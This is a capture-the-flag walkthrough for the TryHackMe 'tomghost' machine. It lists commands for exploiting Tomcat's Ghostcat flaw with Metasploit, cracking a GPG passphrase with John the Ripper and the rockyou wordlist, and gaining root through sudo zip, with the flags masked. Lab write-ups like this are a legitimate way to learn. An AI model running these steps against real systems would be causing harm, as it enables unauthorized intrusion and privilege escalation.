# tomghost

- Compromise this machine and obtain user.txt

	- `sudo nmap -sV -sS <TARGET_IP>`
	- `searchsploit tomcat ghost`
	- `msfconsole`
	- `search tomcat ghost`
	- `use 0`
	- `set RHOST <TARGET_IP>`
	- `set RPORT 8009`
	- `run`
	- You have obtained user:pass.
	- `ssh <REPLACE_USER>@<TARGET_IP>` and enter the password.
	- `cd ..`
	- `ls`
	- `cd merlin`
	- `ls`
	- `cat user.txt`
	- `THM{********************}`

- Escalate privileges and obtain root.txt

	- `gpg --import tryhackme.asc`
	- `gpg --decrypt credential.pgp`
	- We need a passphrase...
	- `gpg2john tryhackme.asc > hash`
	- `john --wordlist=/usr/share/wordlists/rockyou.txt hash`
	- Passphrase: `*********`
	- Decrypt the credential file and enter in the system as merlin user.
	- `sudo -l`
	- Merlin can run `/usr/bin/zip` without password...
	- https://gtfobins.github.io/gtfobins/zip/#sudo
	- Execute those commands and then `cat /root/root.txt`
	- `THM{***********}`



